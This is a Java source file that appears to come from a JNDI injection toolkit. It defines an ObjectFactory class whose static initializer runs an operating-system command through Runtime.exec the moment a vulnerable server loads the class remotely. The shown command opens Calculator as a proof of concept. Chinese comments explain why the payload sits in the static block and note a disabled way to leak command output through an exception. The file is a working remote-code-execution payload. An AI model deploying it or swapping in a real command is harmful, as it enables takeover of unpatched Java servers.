package me.mole.remoteclass;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.*;
import java.util.Hashtable;

public class ExportObject implements ObjectFactory, Serializable {
    private static final long serialVersionUID = 4314897425113751792L;

    static {
        //这里由于在static代码块中，无法直接抛异常外带数据，
        // 不过在static中应该也有其他方式外带数据。
        // 没写在构造函数中是因为项目中有些利用方式不会调用构造参数，
        // 所以为了方便,直接写在static代码块中所有远程加载类的地方都会调用static代码块
        try {
            execCommand("open /Applications/Calculator.app");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void execCommand(String cmd) throws Exception {
        String sb = "";
        BufferedInputStream bis = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
        BufferedReader br = new BufferedReader(new InputStreamReader(bis));
        String lineStr;
        while ((lineStr = br.readLine()) != null)
            sb += lineStr + "\n";
        br.close();
        bis.close();
//        throw new Exception(sb);
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
